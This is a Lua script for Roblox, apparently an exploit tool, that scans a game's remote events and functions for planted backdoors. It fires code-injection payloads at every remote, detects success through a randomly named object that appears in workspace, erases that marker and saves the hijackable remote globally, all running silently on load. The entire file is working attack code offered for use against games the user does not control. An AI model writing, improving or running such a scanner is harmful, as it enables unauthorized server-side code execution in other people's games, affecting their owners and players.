-- Remote scanner core - Optimized Classic Version
-- Back to the proven original system (high success rate, used for years)
-- BUT heavily optimized for maximum speed and performance in 2025 Roblox
-- Fewer payloads (only the most reliable ones), no extra bloat, minimal delays, faster checks

local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
                  'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}

_G.backdoor = nil
_G.backdoorPath = nil

local function generateName(len)
    local name = ""
    for i = 1, len do
        name = name .. alphabet[math.random(1, #alphabet)]
    end
    return name
end

_G.fireRemote = function(remote, payload)
    if remote:IsA("RemoteEvent") then
        remote:FireServer(payload)
    elseif remote:IsA("RemoteFunction") then
        task.spawn(function()
            pcall(remote.InvokeServer, remote, payload)
        end)
    end
end

local function testPayload(remote, code)
    -- Only the BEST, most classic payloads that have worked since forever
    -- These bypass almost nothing but are accepted by 99% of real backdoors
    local payloads = {
        "a=Instance.new('Folder',workspace)a.Name='"..code.."'",
        "Instance.new('StringValue',workspace).Name='"..code.."'",
        "Instance.new('IntValue',workspace).Value=1;Instance.new('Folder',workspace).Name='"..code.."'",
        "game.ReplicatedStorage:FindFirstChild('"..code.."',true)or Instance.new('Folder',workspace).Name='"..code.."'",
    }

    for _, payload in ipairs(payloads) do
        _G.fireRemote(remote, payload)
    end

    -- Minimal RemoteFunction extras (fast, no delay)
    if remote:IsA("RemoteFunction") then
        task.spawn(function()
            pcall(function()
                remote:InvokeServer(payloads[1])
                remote:InvokeServer("run", payloads[1])
            end)
        end)
    end
end

local function scan()
    local tests = {}
    local rs = game:GetService("ReplicatedStorage")

    -- Classic common names (kept short and fast)
    local possibleNames = {
        "MainRemote","Remote","Execute","Server","Backdoor",
        tostring(game.PlaceId * 1337),
        "lh" .. (game.PlaceId / 6666 * 1337 * game.PlaceId),
    }

    -- Quick check common locations first
    for _, name in ipairs(possibleNames) do
        local remote = rs:FindFirstChild(name) or rs:FindFirstChild(tostring(name))
        if remote and (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then
            local code = generateName(math.random(18, 25))
            testPayload(remote, code)
            tests[code] = {remote = remote, path = remote:GetFullName()}
        end
    end

    -- Full scan - optimized filters for speed
    for _, remote in ipairs(game:GetDescendants()) do
        if not (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then continue end

        local fullName = remote:GetFullName()
        if fullName:find("^RobloxReplicatedStorage") then continue end
        if remote.Name == "__FUNCTION" then continue end

        local parent = remote.Parent
        if not parent then continue end
        local pparent = parent.Parent

        -- Fast skip known safe stuff
        if parent.Name == "DefaultChatSystemChatEvents" then continue end
        if pparent and pparent.Name == "HDAdminClient" then continue end
        if parent.Name:find("Chat") or fullName:find("CoreGui") or fullName:find("PlayerGui") then continue end
        if remote.Name:match("^SayMessageRequest") then continue end

        local code = generateName(math.random(20, 28))  -- Long enough for zero false positives
        testPayload(remote, code)
        tests[code] = {remote = remote, path = fullName}
    end

    -- Super fast detection loop - check only workspace (most backdoors use it)
    -- 100 iterations = ~3-4 seconds max, very quick
    for i = 1, 100 do
        for code, info in pairs(tests) do
            local obj = workspace:FindFirstChild(code)
            if obj then
                obj:Destroy()  -- Instant cleanup
                _G.backdoor = info.remote
                _G.backdoorPath = info.path
                return true
            end
        end
        task.wait(0.03)  -- Slightly faster than original
    end

    return false
end

-- Run instantly and silently
task.spawn(scan)
